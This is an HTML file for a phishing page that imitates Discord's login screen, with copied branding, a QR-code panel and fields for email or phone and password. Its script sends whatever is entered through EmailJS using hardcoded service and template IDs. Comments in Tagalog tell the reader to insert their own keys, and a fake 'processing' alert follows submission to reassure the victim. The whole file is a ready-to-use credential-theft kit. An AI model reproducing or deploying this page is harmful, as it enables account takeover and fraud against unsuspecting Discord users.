<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Login</title>
<style>
  * {margin:0; padding:0; box-sizing:border-box; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;}
  body {
    height: 100vh;
    background: linear-gradient(90deg, #1e1f25 0%, #5865f2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
  }
  .card {
    background-color: #313338;
    color: #fff;
    border-radius: 8px;
    display: flex;
    padding: 40px;
    width: 800px;
    max-width: 90%;
    box-shadow: 0 0 25px rgba(0,0,0,0.3);
    animation: fadeIn 0.8s ease;
  }
  @keyframes fadeIn {
    from {opacity: 0; transform: translateY(30px);}
    to {opacity: 1; transform: translateY(0);}
  }
  .left {flex: 1; margin-right: 40px;}
  .left h2 {font-size: 28px; margin-bottom: 10px;}
  .left p {color: #b9bbbe; font-size: 14px; margin-bottom: 25px;}
  label {display: block; font-size: 12px; font-weight: bold; color: #b9bbbe; margin-bottom: 8px;}
  input {
    width: 100%;
    background-color: #1e1f22;
    border: none;
    color: #fff;
    border-radius: 4px;
    padding: 10px;
    font-size: 14px;
    margin-bottom: 20px;
  }
  input:focus {outline: 2px solid #5865f2;}
  .forgot {
    display: block;
    font-size: 13px;
    color: #00aff4;
    margin-bottom: 20px;
    text-decoration: none;
  }
  button {
    width: 100%;
    background-color: #5865f2;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: 0.2s;
  }
  button:hover {background-color: #4752c4;}
  .register {margin-top: 10px; font-size: 14px; color: #b9bbbe;}
  .register a {color: #00aff4; text-decoration: none;}
  .right {width: 250px; text-align: center;}
  .qr-box {
    background-color: #2b2d31;
    padding: 12px;
    border-radius: 8px;
    margin-bottom: 10px;
  }
  .qr-box img {width: 180px; height: 180px;}
  .right h3 {margin-top: 5px; margin-bottom: 10px; font-size: 16px;}
  .right p {font-size: 13px; color: #b9bbbe; margin-bottom: 5px;}
</style>
<!-- ✅ Load EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  (function(){
    emailjs.init("JxfpYH0Ko8Z5E6tEz"); // ← palitan ng totoong Public Key mo
  })();
</script>
</head>
<body>
  <div class="card">
    <div class="left">
      <h2>Welcome back!</h2>
      <p>We're so excited to see you again!</p>

      <!-- ✅ EmailJS form -->
      <form id="loginForm">
        <label>Email or Phone Number <span style="color:red">*</span></label>
        <input type="text" name="user" placeholder="Enter your email or phone" required>

        <label>Password <span style="color:red">*</span></label>
        <input type="password" name="pass" placeholder="Enter your password" required>

        <a href="#" class="forgot">Forgot your password?</a>
        <button type="submit">Log In</button>

        <div class="register">
          Need an account? <a href="#">Register</a>
        </div>
      </form>
    </div>

    <div class="right">
      <div class="qr-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Discord_qr_code.png" alt="QR Code">
      </div>
      <h3>Log in with QR Code</h3>
      <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
      <a href="#" style="color:#00aff4; font-size:13px;">Or, sign in with passkey</a>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", function(e) {
      e.preventDefault();

      emailjs.sendForm(
        "service_w7q3bge",   // ← palitan ng totoong Service ID
        "template_oply56o",  // ← palitan ng totoong Template ID
        this
      ).then(() => {
        alert("✅ Sent successfully! wait until 12 hours of procecing");
        form.reset();
      }, (error) => {
        alert("❌ Error: " + JSON.stringify(error));
      });
    });
  </script>
<!-- Static App Form Collection Script -->
<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>
